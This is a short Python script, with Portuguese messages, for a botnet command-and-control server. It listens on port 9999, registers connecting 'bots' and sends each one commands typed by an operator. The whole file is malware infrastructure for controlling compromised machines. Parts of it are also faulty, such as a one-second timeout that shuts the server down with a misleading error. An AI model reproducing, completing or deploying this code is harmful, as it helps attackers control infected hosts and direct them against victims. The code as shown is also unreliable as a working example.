import socket
import threading

bots = []

def handle_bot(conn, addr):
    print(f"Bot conectado: {addr}")
    bots.append(conn)
    try:
        while True:
            command = input("Digite o comando para enviar aos bots: ")
            conn.sendall(command.encode())
            if command.lower() == "exit":
                break
    finally:
        conn.close()
        bots.remove(conn)
        print(f"Bot desconectado: {addr}")

def server(host='0.0.0.0', port=9999):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        s.bind((host, port))
        s.listen()
        print(f"Servidor de C&C escutando em {host}:{port}.")
        while True:
            try:
                conn, addr = s.accept()
                threading.Thread(target=handle_bot, args=(conn, addr)).start()
            except TimeoutError:
                print("Conexao falhou, veja se o ip e porta foram digitadas corretamente.")
                break